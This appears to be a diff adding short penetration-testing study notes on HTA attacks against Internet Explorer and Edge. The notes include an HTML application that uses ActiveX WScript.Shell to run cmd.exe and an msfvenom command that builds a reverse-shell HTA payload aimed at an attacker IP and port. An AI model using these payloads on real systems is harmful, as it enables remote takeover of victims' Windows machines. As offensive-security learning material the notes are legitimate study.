@@ -1,0 +1,29 @@
+=================
+internet explorer
+=================
+mshta.exe is executed with outscope of security
+MS Edge also
+
+===========================
+exploring html applications
+===========================
+activeX
+	windows script host shell example
+	<html>
+	  <head>
+	    <script>
+	      var c = 'cmd.exe';
+	      new ActiveXObject('WScript.Shell').Run(c);
+	    </script>
+	  </head>
+	  <body>
+	    <script>
+	      self.close();
+	      </script>
+	    </body>
+	</html>
+
+====================
+HTA attack in action
+====================
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<listening port> -f hta-psh -o <output file>
